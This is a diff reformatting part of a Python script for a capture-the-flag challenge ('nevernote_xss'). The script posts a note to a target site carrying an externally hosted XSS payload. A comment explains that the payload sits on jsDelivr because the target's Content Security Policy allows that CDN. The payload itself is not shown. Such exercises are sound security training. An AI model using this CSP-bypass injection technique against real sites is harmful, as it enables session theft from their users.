@@ -12,18 +12,14 @@ from yachalk import chalk
 DOMAIN = os.environ.get("DOMAIN")
 URL = f"http://{DOMAIN}:12345"
 TARGET = f"{URL}/note/new"
-EXTERNALLY_HOSTED_XSS = (
-    "https://cdn.jsdelivr.net/gh/ykray/CTF@master/week_2/nevernote_xss/host-me-on-jsdelivr-cdn.js"
-)
+EXTERNALLY_HOSTED_XSS = "https://cdn.jsdelivr.net/gh/ykray/CTF@master/week_2/nevernote_xss/host-me-on-jsdelivr-cdn.js"  # because cdn.jsdelivr.net allowed by target's CSP
 
 session = requests.Session()
 
 
 def setup_session():
     session.cookies.set(
-        name=os.environ.get("COOKIE_NAME"),
-        value=os.environ.get("COOKIE_VALUE"),
-        domain=DOMAIN,
+        name=os.environ.get("COOKIE_NAME"), value=os.environ.get("COOKIE_VALUE"), domain=DOMAIN,
     )
 
     print(chalk.bold("COOKIES\t"), chalk.black(session.cookies.get_dict()))
@@ -39,8 +35,5 @@ if __name__ == "__main__":
         "submit": "save",
     }
 
-    new_note_request = session.post(
-        TARGET,
-        new_note_data,
-    )
+    new_note_request = session.post(TARGET, new_note_data,)
     new_note_request.raise_for_status()
